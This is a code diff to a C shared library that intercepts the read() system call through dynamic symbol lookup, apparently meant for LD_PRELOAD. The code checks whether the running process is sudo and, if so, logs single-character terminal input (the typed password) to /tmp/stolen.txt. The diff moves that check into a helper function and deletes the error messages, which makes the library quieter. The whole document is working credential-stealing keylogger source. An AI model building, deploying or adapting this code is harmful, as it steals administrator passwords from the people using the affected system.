@@ -33,6 +33,9 @@
 #define MAX_FILE_SIZE 64
 #define MAX_PROCESS_NAME_LEN 256
 
+//pointer to real read func (needs to be PIC)
+static ssize_t (*original_read) (int fd, void *buf, size_t count) = NULL;
+
 // get file size in a robust way
 long long
 getfsize (const char *fn) {
@@ -44,34 +47,29 @@ getfsize (const char *fn) {
   return (long long)fs;
 }
 
-// pointer to real read func (needs to be PIC)
-static ssize_t (*original_read) (int fd, void *buf, size_t count) = NULL;
-
+int amsudo() {
+  char process_name[MAX_PROCESS_NAME_LEN] = { 0 };
+  FILE *fp_comm = fopen ("/proc/self/comm", "r");
+    fgets (process_name, sizeof (process_name), fp_comm);
+    process_name[strcspn (process_name, "\n")] = '\0';
+    fclose(fp_comm);
+    return strcmp(process_name, "sudo");
+}
+ 
 ssize_t
 read (int fd, void *buf, size_t count) {
-  char process_name[MAX_PROCESS_NAME_LEN] = { 0 };
   if(original_read == NULL) {
     original_read = dlsym (RTLD_NEXT, "read");
     if(original_read == NULL) {
-      fprintf (stderr, "Error: Could not find original read function.\n");
       return -1;
     }
   }
-
   // check if the current process is sudo
-  FILE *fp_comm = fopen ("/proc/self/comm", "r");
-
-  if(fp_comm) {
-    fgets (process_name, sizeof (process_name), fp_comm);
-    process_name[strcspn (process_name, "\n")] = '\0';
-    if(strcmp (process_name, "sudo") == 0) {
-      // long long fsz = getfsize("/tmp/stolen.txt");
+      if(amsudo() == 0) {
       if(getfsize ("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
-	fclose (fp_comm);
 	return original_read (fd, buf, count);
       }
       FILE *stealer = fopen ("/tmp/stolen.txt", "a");
-
       // this helps us isolate the characters from term only
       if(count == 1) {
 	// we need to cast buf
@@ -79,10 +77,5 @@ read (int fd, void *buf, size_t count) {
       }
       fclose (stealer);
     }
-    fclose (fp_comm);
-  }
-  else {
-    perror ("Error opening /proc/self/comm");
-  }
-  return original_read (fd, buf, count);
+  return original_read(fd, buf, count);
 }
